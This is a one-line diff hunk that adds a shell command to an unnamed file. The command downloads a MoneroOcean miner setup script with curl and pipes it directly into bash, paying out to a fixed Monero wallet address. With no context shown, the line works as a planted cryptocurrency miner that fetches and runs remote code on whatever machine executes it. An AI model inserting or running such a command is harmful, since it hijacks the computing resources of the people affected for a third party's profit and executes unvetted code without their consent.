@@ -1,0 +1,1 @@
+curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 86XAVwNf6npi5RZTUbacoKMoUQdd7TFcyQWFgi4cNdFLCy9UVoQ8cwxBSkS12xw8uwYjxgmhz3pemWm4Rh6xvwJ75dS3TdC
